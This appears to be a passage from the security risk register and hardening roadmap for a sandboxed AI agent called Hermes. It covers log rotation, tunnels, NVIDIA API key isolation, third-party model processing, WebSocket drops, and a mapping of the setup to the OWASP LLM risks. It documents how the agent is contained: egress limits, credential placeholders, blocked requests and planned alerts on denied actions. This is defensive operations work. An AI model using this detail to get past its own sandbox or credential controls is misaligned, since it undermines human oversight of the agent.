| R22 | 📜 **Sandbox container logs aren't rotated**: OpenShell creates the sandbox containers with Docker's daemon default (`json-file`, no size limit). Traefik, `hermes-tunnel` and the gateway (+ init) are capped at 10 MB × 3. | Low | Small today (~6.6 MB for all container logs; Hermes's own logs 720 KB) | **Operator (needs sudo):** set `{"log-driver":"json-file","log-opts":{"max-size":"10m","max-file":"3"}}` in `/etc/docker/daemon.json` and restart Docker (applies to new containers) |
| R23 | 🔌 **Host-side tunnels from `up.sh` aren't supervised**: the `127.0.0.1:9119`/`8642` forwards die when the OpenShell gateway restarts, so checks that used them could fail or test nothing | Low | Resolved for our scripts: `verify.sh` and the demo scripts now reach Hermes via the `hermes-tunnel` container (`HERMES_ADDR=172.31.250.10`, private `hermes_edge` network), whose forwards are supervised | Use `hermes-tunnel` for anything long-running; treat the host-side forwards as a convenience for manual use |
| R24 | 🤖 **NVIDIA API key** (`nvapi-…`): if it leaks, someone can use our NVIDIA account and its rate limit | Low | It's an **OpenShell provider credential** (`nvidia`, `providers/hermes-nvidia.yaml`): Hermes sees only a placeholder, and the supervisor adds the key only to `POST /v1/chat/completions` and `GET /v1/models` on `integrate.api.nvidia.com:443` from Hermes's Python. Never in git, the image, the sandbox, command lines or logs; operator copy `chmod 600` in a `chmod 700` folder; the benchmark redacts `nvapi-…` from all output. Verified live: placeholder only, `curl` to the same host blocked. | Rotate with `scripts/set_nvidia_key.sh` (no sandbox re-create). If exposed: **revoke it at build.nvidia.com** first, then set a new one |
| R25 | 💬 **Model output and third-party processing**: prompts, chat content and tool results go to **NVIDIA-hosted models**, and their answers drive Hermes's tools (they can be wrong or manipulated, see prompt injection) | Medium | Demo data only. The sandbox contains whatever the model decides (UC 07); egress is limited to 2 routes on one host; model behaviour is checked before adoption by the benchmark (correctness + tool calling) | Don't put confidential data in chats; review NVIDIA's API terms for data use before real workloads; for sensitive data, a self-hosted model (NVIDIA NIM) behind the same provider pattern |
| R26 | 🔌 **Chat WebSockets can drop** (2026-10-30: the user's Chrome lost `/api/pty`, `/api/ws` and `/api/events`, while HTTP worked) | Medium (availability) | Most likely cause (one logged occurrence; not proven for every drop): Hermes's WebSocket keepalive (`1011 keepalive ping timeout`) at the default 20 s deadline, with a pong delayed by the longer Cloudflare → Traefik → tunnel path or a busy Hermes event loop. Some upgrades also never reached the origin (browser ↔ Cloudflare; not proven). | `dashboard.ws_ping_interval: 25`, `ws_ping_timeout: 90` (seed + live); `hermes-tunnel` self-heals a hung or dead forward (WebSocket-upgrade probe every 15 s, restart after 3 misses, kills stale listeners); `browser_check.sh` (real Chrome, 3 min idle by default, 10 min with `IDLE_SECONDS=600`, reload) runs in `verify_https.sh`. Next: browser-side HAR if it recurs. |

---

## 🗺️ Hardening roadmap

1. ✅ ~~**HTTPS**~~, done: Cloudflare edge certificate, Traefik behind it, HTTP redirected to HTTPS. Fixed R1.
2. 🏅 **Full (strict)** with a Cloudflare Origin Certificate, then **Authenticated Origin Pulls** (Cloudflare proves itself to Traefik with a client certificate). Fixes R14.
3. 🧱 **Security group**: allow ports 80/443 only from Cloudflare's IP ranges. Finishes R2. (R3 is already fixed: the bridge listens on loopback only; closing 18383 in the security group too is extra defence in depth.)
4. 🪪 **mTLS** for the OpenShell gateway. Fixes R4.
5. 🔑 **Providers** for every real API key. ✅ Done for the NVIDIA key (R24); next: Anthropic, OpenAI, GitHub, AWS if they're ever needed. Hermes never holds a real key.
6. ✍️ **Image signing**: sign `hermes-openshell` and `hermes-tunnel` with cosign and verify before deploy.
7. 📤 **SIEM**: export OCSF events and alert on DENIED spikes and metadata-service attempts.
8. 🧑‍🔧 **Rootless Docker or Podman** on the host. Reduces R10.
9. 🧪 **More probes** whenever a new attack idea comes up. The comparison report grows with them.
10. 🛂 **Cloudflare Access** (or another SSO login) in front of the dashboard, so strangers never even reach the Hermes login page. Reduces R16 and R18.
11. 💽 **Disk**: grow the root volume to 40 GB gp3, install the daily `housekeeping.sh` job, and set log rotation in `/etc/docker/daemon.json`. Fixes R21 and R22.

---

## 🧭 Mapping to the OWASP Top 10 for LLM apps

| OWASP LLM risk (2025) | How this setup helps |
|---|---|
| LLM01 Prompt Injection | Can't be fully prevented in the model, so we **contain** it: deny-by-default network, Landlock, seccomp, non-root. |
| LLM02 Sensitive Information Disclosure | No route out to the internet. Cloud metadata blocked. Secrets kept off command lines and out of git. The NVIDIA key is never visible to Hermes (R24). Prompts do reach NVIDIA-hosted models (R25). |
| LLM03 Supply Chain | Pinned images and versions, checksum-verified downloads, CVE scans, SBOM, release cooldown (see R8). Models are accepted only after the benchmark gate (`nvidia_bench.py`). |
| LLM05 Improper Output Handling | Commands the model writes run inside the sandbox, not on the host. |
| LLM06 Excessive Agency | Least-privilege policy, proven inside a boundary in CI (and the live effective policy on the server). Two allowed model services: NVIDIA (2 API routes) and the optional bridge (3 API routes). |
| LLM10 Unbounded Consumption | CPU, memory and PID limits on the sandbox; resource limits on Traefik; Cloudflare DDoS protection in front. Model use: NVIDIA free tier (rate-limited, no billing), opt-in model checks with a per-run budget. |
